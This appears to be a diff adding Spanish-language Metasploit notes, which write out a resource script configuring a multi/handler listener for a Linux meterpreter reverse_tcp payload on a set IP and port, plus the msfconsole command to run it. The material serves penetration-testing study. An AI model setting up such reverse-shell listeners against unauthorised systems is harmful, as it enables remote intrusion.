@@ -1,0 +1,28 @@
+#Si nos metemos dentro de "metasploit" y ejecutamos "help" podremos ver todas las opciones que tiene este "framework", 
+#al ser una herramienta tan completa tendra muchisimas opciones.
+
+#Si queremos iniciar "metasploit" con un archivo que se autoconfigure en este caso con 
+#una escucha de "metasploit" se podra hacer de la siguiente forma:
+
+$ nano handler.rc
+
+========================================
+use multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.11.20
+set LPORT 7777
+set ExitOnSession false
+run
+========================================
+
+#Y despues ejecutarlo asi:
+
+$ msfconsole -r handler.rc -q
+
+#Si queremos iniciarlo con una base de datos de "PostgreSQL" con "metasploit" podremos ejecutar lo siguiente:
+
+$ ./Metasploit+PostgreSQL.sh
+
+#Mas informacion en el siguiente Script en mi GitBook:
+
+$ ./InfoMetasploitGitBook.sh
